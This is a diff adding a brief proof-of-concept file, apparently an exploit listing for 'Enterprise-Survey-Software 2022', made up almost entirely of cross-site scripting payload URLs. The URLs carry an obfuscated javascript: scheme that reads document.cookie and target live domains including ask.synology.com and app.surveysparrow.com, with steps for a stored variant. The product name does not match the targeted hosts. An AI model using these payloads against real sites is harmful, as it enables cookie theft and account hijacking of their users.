@@ -1,0 +1,15 @@
+Product: Enterprise-Survey-Software 2022
+
+For Reflected XSS
+
+https://ask.synology.com/login?test=Javascript%26colon;%252F%252F%E2%80%A9confirm?.(document.cookie)//
+
+For Stored XSS
+
+Visit https://ask.synology.com/login?test=Javascript%26colon;%252F%252F%E2%80%A9confirm?.(document.cookie)//
+
+now click on signup button
+or
+visit
+https://app.surveysparrow.com/signup?test=Javascript%26colon;%252F%252F%E2%80%A9confirm?.(document.cookie)//
+
